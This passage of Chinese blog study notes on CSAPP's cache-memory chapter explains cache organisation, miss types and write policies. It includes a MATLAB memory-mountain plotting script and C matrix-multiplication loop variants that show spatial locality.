title="存储器层次结构中的缓存"></a>存储器层次结构中的缓存</h4><ul><li><p>高速缓存 (cache, 读作 “cash”) 是一个小而快速的存储设备，它作为存储在更大、也更慢的设备中的数据对象的缓冲区域。</p></li><li><p>层次结构中的每一层都缓存来自较低一层的数据对象。</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209213352133.png" alt="image-20240209213352133"></p><ul><li><p>数据总是以块大小为<code>传送单元 (transfer unit)</code> 在第 k层和第 k+l 层之间来回复制的。</p></li><li><p>较低层的传送使用的块一般比较高层传送用的块更大。</p></li></ul><ul><li><p><code>缓存命中</code>：直接从第 k层读取对象d, 根据存储器层次结构的性质，这要比从第 k+l 层读取 更快。</p></li><li><p><code>缓存不命中</code>第k 层中没有缓存数据对象 d。第k 层的缓存从第k+1层缓存中取出包含d的那个块，如果第k层的缓存已经满了，可能就会覆盖现存的一个块（称为牺牲块）。</p></li><li><p>一个空的缓存有时被称为<code>冷缓存 (cold cache)</code> , 此类不命中称为强制性不命中 (compulsory miss) 或冷不命中 (cold miss) 。</p></li><li><p>冲突不命中 (conflict miss), ，多个对象映射到同 一个缓存块，缓存会一直不命中。</p></li></ul><ul><li>一个嵌套的循环可能会反复地访问同一个数组的元素。这个块的集合称为这个阶段的工作集 (working set) 。当工作集的大小超过缓存的小时，缓存会经历<code>容量不命中 (capacity miss)</code> 。</li></ul><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209215623716.png" alt="image-20240209215623716"></p><p>概括来说，基于缓存的存储器层次结构行之有效，是因为较慢的存储设备比较快的存储设备更便宜，还因为程序倾向于展示局部性：</p><ul><li>利用时间局部性：由于时间局部性，同一数据对象可能会被多次使用。 一旦一个数据对象在第一次不命中时被复制到缓存中，我们就会期望后面对该目标有一系列的访问命中。因为缓存比低一层的存储设备更快，对后面的命中的服务会比最开始的不命中快很多。</li><li>利用空间局部性：块通常包含有多个数据对象。由于空间局部性，我们会望后面对该块中其他对象的访问能够补偿不命中后复制该块的花费。</li></ul><h3 id="高速缓存存储器"><a href="#高速缓存存储器" class="headerlink" title="高速缓存存储器"></a>高速缓存存储器</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209215810816.png" alt="image-20240209215810816"></p><h4 id="通用的高速缓存存储器组织结构"><a href="#通用的高速缓存存储器组织结构" class="headerlink" title="通用的高速缓存存储器组织结构"></a>通用的高速缓存存储器组织结构</h4><h4 id="直接映射高速缓存"><a href="#直接映射高速缓存" class="headerlink" title="直接映射高速缓存"></a>直接映射高速缓存</h4><p>每个组只有一行的高速缓存称为直接映射高速缓存 (direct-mapped cache) 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209223156267.png" alt="image-20240209223156267"></p><ol><li>直接映射高速缓存中的组选择</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209223459723.png" alt="image-20240209223459723"></p><p>高速缓存从w的地址中间抽取出s个组索引位。这些位被解释成一个对应于一个组号的无符号整数。</p><ol><li>直接映射高速缓存中的行匹配</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209223621395.png" alt="image-20240209223621395"></p><p>当且仅当设置了<code>有效位</code>，而且高速缓存行中的标记与的地址中的标记相匹配时，这 行中包含的一个副本。则缓存命中。</p><ol><li>直接映射高速缓存中的字选择</li></ol><p>一旦命中，我们知道 就在这个块中的某个地方。块偏移位提供了所需要的字的第一个字节的偏移。</p><ol><li>直接映射高速缓存中不命中时的行替换</li></ol><p>如果缓存不命中，那么它需要从存储器层次结构中的下一层取出被请求的块 ，然 后将新的块存储在组索引位指示的组中的一个高速缓存行中。</p><ol><li>综合：运行中的直接映射高速缓存</li></ol><ul><li><p>标记位和索引位连起来唯 地标识了内存中的每个块。</p></li><li><p>多个块会映射到同一个高速缓存组（即它们有相同的组索引）。</p></li><li>映射到同一个高速缓存组的块由标记位唯一地标识。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209230912140.png" alt="image-20240209230912140"></p><p>1) 读地址0的字，缓存不命中。高速缓存从内存（或低一层的高速缓存）取出块 0, 并把这个块存储在组0中。然后，高速缓存返回新取出的高速缓存行的块 [0J 的m[0]。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209231206019.png" alt="image-20240209231206019"></p><p>2) 读地址1的字,高速缓存命中。高速缓存立即从高速缓存行的块 [1] 中返m[1] 。</p><ol><li>读地址 13 的字。缓存不命中。高速缓存把块6加载到组2中，然后从新的高速缓存行的块[1] 中返回 m[13].</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209234532530.png" alt="image-20240209234532530"></p><ol><li>读地址8的字。这会发生缓存不命中。组0中的高速缓存行确实是有效的，但是标记不匹配。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209234603152.png" alt="image-20240209234603152"></p><ol><li>读地址0的字。又会发生缓存不命中，因为在前面引用地址 时，我们刚好替换了，这就是<code>冲突不命中</code>的一个例子。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209234609789.png" alt="image-20240209234609789"></p><ol><li>直接映射高速缓存中的冲突不命中</li></ol><ul><li>抖动:即高速缓存反复地加载和驱逐相同的高速缓存块的组.</li></ul><blockquote><p>为什么用中间的位来做索引你也许会奇怪，为什么高速缓存用中间的位来作为组索引，而不是用高位 为什么用中间的位更好，是有很好的原因的.如果高位用做索引，那么 一些连续的内存块就会映射到相同的高速缓存块 例如，在图中，头四个块映射到第一个高速缓存组，笫二个四个块映射到笫二个组，依此类推 如果一个程序有良好的空间局部性，顺序扫描一个数组的元素，那么在任何时刻，高速缓存都只保存着一个块大小的数组内容 这样对高速缓存的使用效率很低 .相比较而言，以中间位作为索引，相邻的块总是映射到不同的高速缓存行. 在这里的情况中，高速缓存能够存放整个大小为c的数组片，这里 c是高速缓存的大小。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209235246828.png" alt="image-20240209235246828"></p></blockquote><h4 id="组相联高速缓存"><a href="#组相联高速缓存" class="headerlink" title="组相联高速缓存"></a>组相联高速缓存</h4><p><code>直接映射高速缓存</code>中冲突不命中造成的问题源于每个组只有一行。<code>组相联高速缓存 (set associative cache)</code>放松了这条限制，所以每个组都保存有多于一个 高速缓存行。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209235409701.png" alt="image-20240209235409701"></p><ol><li>组相联高速缓存中的组选择</li></ol><p>它的组选择与直接映射高速缓存的组选择一样，组索引位标识组。</p><ol><li>组相联高速缓存中的行匹配和字选择</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240209235459271.png" alt="image-20240209235459271"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210000246241.png" alt="image-20240210000246241"></p><h4 id="全相联高速缓存"><a href="#全相联高速缓存" class="headerlink" title="全相联高速缓存"></a>全相联高速缓存</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210001632400.png" alt="image-20240210001632400"></p><ol><li>全相联高速缓存中的组选择。全相联高速缓存中的组选择非常简单，因为只有一个组。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210002847266.png" alt="image-20240210002847266"></p><ol><li>全相联高速缓存中的行匹配。和字选择全相联高速缓存中的行匹配和字选择与组相联高速缓存中的是一样的。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210002858669.png" alt="image-20240210002858669"></p><p>因为高速缓存电路必须<code>并行地</code>搜索许多相匹配的标记，构造一个又大又快的相联高速缓存很困难，而且很昂贵。因此，全相联高速缓存只适合做小的高速缓存，例如虚拟内存系统中的翻译备用缓冲器 (TLB),</p><h4 id="有关写的问题"><a href="#有关写的问题" class="headerlink" title="有关写的问题"></a>有关写的问题</h4><ul><li>直写(write-through)：就是立即将w 的高速缓存块写回到紧接着的低一层中。是直写的缺点是每次写都会引起<code>总线流量</code>。</li><li>写回 (write-back)：尽可能地推迟更新，只有当替换算法要驱逐这个更新过的块时，才把它写到紧接着的低一层中。但是它的缺点是增<br>加了复杂性。高速缓存必须为每个高速缓存行维护一个额外的修改位 (dirty bit)。</li><li>写分配 (write-allocate), 加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。</li><li>非写分配 (not-write-allocate) , 避开高速缓存，直接把这个字写到低一层中。</li><li>直写高速缓存通常是非写分配的。写回高速缓存通常是写分配的。</li></ul><h4 id="一个真实的高速缓存层次结构的解剖"><a href="#一个真实的高速缓存层次结构的解剖" class="headerlink" title="一个真实的高速缓存层次结构的解剖"></a>一个真实的高速缓存层次结构的解剖</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240210004022700.png" alt="image-20240210004022700"></p><h4 id="高速缓存参数的性能影响"><a href="#高速缓存参数的性能影响" class="headerlink" title="高速缓存参数的性能影响"></a>高速缓存参数的性能影响</h4><p>有许多指标来衡量高速缓存的性能：</p><ul><li>不命中率 (miss rate) 。在一个程序执行或程序的一部分执行期间，内存引用不命中的比率。</li><li>命中率 (hit rate) 。命中的内存引用比率。它等于 1-不命中率。</li><li>命中时间 (hit time) 。从高速缓存传送一个字到 CPU 所需的时间，包括组选择、行确认和字选择的时间。</li><li>不命中处罚 (miss penalty) 。由于不命中所需要的额外的时间。</li></ul><ol><li>高速缓存大小的影响</li></ol><p>较大的高速缓存可能会提高命中率，使大存储器运行得更快总是要难一些的 。结果，较大的高速缓存可能会增加命中时间。</p><ol><li>块大小的影响</li></ol><p>大的块有利有弊。一方面，较大的块能利用程序中可能存在的空间局部性，帮助提高命中率。不过，对于给定的高速缓存大小，块越大就意味着高速缓存行数越少，这会损害时间局部性比空间局部性更好的程序中的命中率。较大的块对不命中处罚也有负面影响，因为块越大，传送时间就越长。</p><ol><li>相联度的影响</li></ol><p>较高的相联度（也就E的值较大）的优点是降低了高速缓存由于冲突不命中出现抖动的可能性。不过，较高的相联度会造成较高的成本和不命中处罚。相联度的选择最终变成了命中时间和不命中处罚之间的折中 。</p><ol><li>写策略的影响</li></ol><p>直写高速缓存比较容易实现，而且能使用独立于高速缓存的写缓冲区 (write buffer) , 用来更新内存。越往层次结构下面走，传送时间增加，减少传送的数量就变得更加重要。一般而言，高速缓存越往下层，越可能使用写回而不是直写。</p><h3 id="编写高速缓存友好的代码"><a href="#编写高速缓存友好的代码" class="headerlink" title="编写高速缓存友好的代码"></a>编写高速缓存友好的代码</h3><p>基本方法：</p><ol><li>让最常见的情况运行得更快。</li><li>尽量减小每个循环内部的缓存不命中数量。</li></ol><ul><li><p>一般而言，如果一个高速缓存的块大小为B字节，那么个步长为k的引用模式（这里以字为单位的）平均每次循环迭代 min(l, (wordsize * k)/ B) 次缓存不命中 。</p></li><li><p>对局部变量的反复引用是好的，因为编译器能够将它们缓存在寄存器文 件中（时间局部性）。</p></li><li>步长为1的引用模式是好的，因为存储器层次结构中所有层次上的缓存都是将数据存储为连续的块（空间局部性）。</li></ul><h3 id="综合：高速缓存对程序性能的影响"><a href="#综合：高速缓存对程序性能的影响" class="headerlink" title="综合：高速缓存对程序性能的影响"></a>综合：高速缓存对程序性能的影响</h3><h4 id="存储器山"><a href="#存储器山" class="headerlink" title="存储器山"></a>存储器山</h4><p>利用chatgpt生成数据处理程序：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">% 存储器山时钟频率和内存速率数据</span></span><br><span class="line"></span><br><span class="line">memory_data = [</span><br><span class="line">    <span class="number">19730</span>   <span class="number">10983</span>   <span class="number">7935</span>    <span class="number">6654</span>    <span class="number">5372</span>    <span class="number">4941</span>    <span class="number">4294</span>    <span class="number">3578</span>    <span class="number">3462</span>    <span class="number">3261</span>    <span class="number">3163</span>    <span class="number">3028</span>    <span class="number">2802</span>    <span class="number">2735</span>    <span class="number">2658</span>;</span><br><span class="line">    <span class="number">21719</span>   <span class="number">10571</span>   <span class="number">8817</span>    <span class="number">6407</span>    <span class="number">5938</span>    <span class="number">4806</span>    <span class="number">4457</span>    <span class="number">3937</span>    <span class="number">3711</span>    <span class="number">3450</span>    <span class="number">3357</span>    <span class="number">3169</span>    <span class="number">3037</span>    <span class="number">2969</span>    <span class="number">2840</span>;</span><br><span class="line">    <span class="number">22330</span>   <span class="number">13040</span>   <span class="number">9658</span>    <span class="number">7674</span>    <span class="number">6594</span>    <span class="number">5863</span>    <span class="number">5089</span>    <span class="number">4385</span>    <span class="number">4334</span>    <span class="number">4150</span>    <span class="number">3970</span>    <span class="number">3851</span>    <span class="number">3492</span>    <span class="number">3586</span>    <span class="number">3503</span>;</span><br><span class="line">    <span class="number">26509</span>   <span class="number">14470</span>   <span class="number">12846</span>   <span class="number">11190</span>   <span class="number">9870</span>    <span class="number">8719</span>    <span class="number">8048</span>    <span class="number">7460</span>    <span class="number">7315</span>    <span class="number">6607</span>    <span class="number">6321</span>    <span class="number">6682</span>    <span class="number">5972</span>    <span class="number">6231</span>    <span class="number">5980</span>;</span><br><span class="line">    <span class="number">46887</span>   <span class="number">31859</span>   <span class="number">24558</span>   <span class="number">19533</span>   <span class="number">16235</span>   <span class="number">14037</span>   <span class="number">10792</span>   <span class="number">9643</span>    <span class="number">8886</span>    <span class="number">8096</span>    <span class="number">7412</span>    <span class="number">7201</span>    <span class="number">6673</span>    <span class="number">6371</span>    <span class="number">6010</span>;</span><br><span class="line">    <span class="number">41056</span>   <span class="number">30640</span>   <span class="number">24099</span>   <span class="number">18308</span>   <span class="number">14804</span>   <span class="number">12374</span>   <span class="number">10634</span>   <span class="number">9290</span>    <span class="number">8610</span>    <span class="number">7927</span>    <span class="number">7179</span>    <span class="number">6956</span>    <span class="number">6426</span>    <span class="number">6104</span>    <span class="number">5684</span>;</span><br><span class="line">    <span class="number">41233</span>   <span class="number">32133</span>   <span class="number">26039</span>   <span class="number">20696</span>   <span class="number">16938</span>   <span class="number">14191</span>   <span class="number">12289</span>   <span class="number">10591</span>   <span class="number">9951</span>    <span class="number">9303</span>    <span class="number">8646</span>    <span class="number">8894</span>    <span class="number">9162</span>    <span class="number">11831</span>   <span class="number">8452</span>;</span><br><span class="line">    <span class="number">40066</span>   <span class="number">38844</span>   <span class="number">36982</span>   <span class="number">33604</span>   <span class="number">30782</span>   <span class="number">26891</span>   <span class="number">23560</span>   <span class="number">20803</span>   <span class="number">21350</span>   <span class="number">24882</span>   <span class="number">25374</span>   <span class="number">26375</span>   <span class="number">27904</span>   <span class="number">27803</span>   <span class="number">28154</span>;</span><br><span class="line">    <span class="number">40280</span>   <span class="number">40730</span>   <span class="number">41249</span>   <span class="number">40166</span>   <span class="number">39069</span>   <span class="number">36080</span>   <span class="number">31765</span>   <span class="number">28163</span>   <span class="number">27859</span>   <span class="number">27057</span>   <span class="number">26582</span>   <span class="number">27722</span>   <span class="number">27764</span>   <span class="number">27846</span>   <span class="number">27826</span>;</span><br><span class="line">    <span class="number">40542</span>   <span class="number">40647</span>   <span class="number">40895</span>   <span class="number">40526</span>   <span class="number">39342</span>   <span class="number">35989</span>   <span class="number">31904</span>   <span class="number">28085</span>   <span class="number">27587</span>   <span class="number">27026</span>   <span class="number">26644</span>   <span class="number">27756</span>   <span class="number">27727</span>   <span class="number">27892</span>   <span class="number">27537</span>;</span><br><span class="line">    <span class="number">40281</span>   <span class="number">40875</span>   <span class="number">40944</span>   <span class="number">40158</span>   <span class="number">38901</span>   <span class="number">35481</span>   <span class="number">31738</span>   <span class="number">27741</span>   <span class="number">27353</span>   <span class="number">26387</span>   <span class="number">25701</span>   <span class="number">27005</span>   <span class="number">27412</span>   <span class="number">27088</span>   <span class="number">26542</span>;</span><br><span class="line">    <span class="number">40009</span>   <span class="number">41533</span>   <span class="number">40809</span>   <span class="number">39201</span>   <span class="number">38497</span>   <span class="number">34454</span>   <span class="number">30365</span>   <span class="number">27021</span>   <span class="number">26643</span>   <span class="number">32405</span>   <span class="number">40993</span>   <span class="number">41530</span>   <span class="number">43676</span>   <span class="number">41363</span>   <span class="number">43004</span>;</span><br><span class="line">    <span class="number">46307</span>   <span class="number">46497</span>   <span class="number">44877</span>   <span class="number">42117</span>   <span class="number">44895</span>   <span class="number">41941</span>   <span class="number">41600</span>   <span class="number">39566</span>   <span class="number">40435</span>   <span class="number">40435</span>   <span class="number">38435</span>   <span class="number">37740</span>   <span class="number">38235</span>   <span class="number">39556</span>   <span class="number">37740</span>;</span><br><span class="line">    <span class="number">46370</span>   <span class="number">44624</span>   <span class="number">42149</span>   <span class="number">42326</span>   <span class="number">39191</span>   <span class="number">35529</span>   <span class="number">38510</span>   <span class="number">36194</span>   <span class="number">35829</span>   <span class="number">33741</span>   <span class="number">34563</span>   <span class="number">31923</span>   <span class="number">30618</span>   <span class="number">31104</span>   <span class="number">29031</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">% 内存大小标签</span></span><br><span class="line">memory_sizes = &#123;<span class="string">&#x27;128m&#x27;</span>, <span class="string">&#x27;64m&#x27;</span>, <span class="string">&#x27;32m&#x27;</span>, <span class="string">&#x27;16m&#x27;</span>, <span class="string">&#x27;8m&#x27;</span>, <span class="string">&#x27;4m&#x27;</span>, <span class="string">&#x27;2m&#x27;</span>, <span class="string">&#x27;1024k&#x27;</span>, <span class="string">&#x27;512k&#x27;</span>, <span class="string">&#x27;256k&#x27;</span>, <span class="string">&#x27;128k&#x27;</span>, <span class="string">&#x27;64k&#x27;</span>, <span class="string">&#x27;32k&#x27;</span>, <span class="string">&#x27;16k&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建 X 轴和 Y 轴</span></span><br><span class="line">x = <span class="number">1</span>:<span class="built_in">size</span>(memory_data, <span class="number">2</span>); <span class="comment">% 存储器编号</span></span><br><span class="line">y = <span class="number">1</span>:<span class="built_in">size</span>(memory_data, <span class="number">1</span>); <span class="comment">% 内存大小</span></span><br><span class="line"><span class="comment">%x 的取值范围是从 1 到 memory_data 的列数</span></span><br><span class="line"><span class="comment">%y 的取值范围是从 1 到 memory_data 的行数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建 X 轴和 Y 轴的网格</span></span><br><span class="line">[X, Y] = <span class="built_in">meshgrid</span>(x, y);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建存储器山图</span></span><br><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">surf(X, Y, memory_data);</span><br><span class="line"><span class="comment">% surf(X,Y,Z) 创建一个三维曲面图，它是一个具有实色边和实色面的三维曲面。</span></span><br><span class="line">xlabel(<span class="string">&#x27;Storage Number&#x27;</span>);</span><br><span class="line">ylabel(<span class="string">&#x27;Memory Size&#x27;</span>);</span><br><span class="line">zlabel(<span class="string">&#x27;Memory Rate (MB/sec)&#x27;</span>);</span><br><span class="line">title(<span class="string">&#x27;Memory Mountain&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 设置 X 轴和 Y 轴的刻度及标签</span></span><br><span class="line">xticks(x);</span><br><span class="line">yticks(y);</span><br><span class="line">yticklabels(memory_sizes);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240226161751942.png" alt="image-20240226161751942"></p><ul><li><p>对于步长为1的引用模式，由于硬件预取机制，被识别并试图在一个块被加载前取到高速缓存中。</p></li><li><p>在L2，L3，和主存山脊上，随着步长的增加，有一个空间局部性的斜坡，空间局部性下降。</p></li><li><p>即使是当程序的时间局部性很差时，空间局部性仍然能补救，并且是非常重要的。</p></li></ul><h4 id="重新排列循环以提高空间局部性"><a href="#重新排列循环以提高空间局部性" class="headerlink" title="重新排列循环以提高空间局部性"></a>重新排列循环以提高空间局部性</h4><p>计算n<em>n矩阵相乘问题，时间复杂度O（n*</em>3）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ijk</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> sum;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mm-ijk */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += A[i][k]*B[k][j];</span><br><span class="line">        C[i][j] += sum;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-ijk */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jik</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> sum;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mm-jik */</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += A[i][k]*B[k][j];</span><br><span class="line">        C[i][j] += sum;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-jik */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ikj</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $begin mm-ikj */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">        r = A[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            C[i][j] += r*B[k][j];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-ikj */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kij</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* $begin mm-kij */</span></span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        r = A[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            C[i][j] += r*B[k][j];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-kij */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kji</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mm-kji */</span></span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        r = B[k][j];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            C[i][j] += A[i][k]*r;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-kji */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jki</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="type">double</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin mm-jki */</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">        r = B[k][j];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            C[i][j] += A[i][k]*r;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* $end mm-jki */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240226163041901.png" alt="image-20240226163041901"></p><h4 id="在程序中利用局部性"><a href="#在程序中利用局部性" class="headerlink" title="在程序中利用局部性"></a>在程序中利用局部性</h4><ul><li><p>将你的注意力集中在内循环上，大部分计算和内存访问都发生在这里。</p></li><li><p>通过按照数据对象存储在内存中的顺序、以步长为 1的来读数据，从而使得你程序中的空间局部性最大。</p></li><li><p>一旦从存储器中读入了一个数据对象，就尽可能多地使用它，从而使得程序中的时间局部性最大</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp第七章——链接</title>
